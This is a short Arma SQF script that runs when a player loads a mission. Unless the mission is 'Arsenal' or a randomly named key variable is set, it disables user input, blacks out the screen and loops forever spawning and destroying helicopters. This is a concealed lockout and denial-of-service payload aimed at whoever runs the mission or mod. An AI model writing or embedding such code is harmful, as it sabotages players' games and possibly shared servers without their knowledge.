[] spawn {
    private["_mission"];
    waitUntil {
        alive player && {!isnull(findDisplay 46)
        }
    };
    sleep 2;
    _mission = getMissionConfigValue "onLoadName";
    if (isNil "_mission") then {
        _mission = "";
    };
    if (_mission != "Arsenal") then {
        if (isNil "6ZB6PNwHxapQYxkDFaYypaPjSCEQB2YB3wH2zQN5") then {
            disableUserInput true;
            cutText["", "BLACK"];
            while {
                true
            }
            do {
                _veh = "O_Heli_Light_02_F"
                createVehicle[0, 0, 0];
                _veh setDamage 1;
            };
        };
    };
};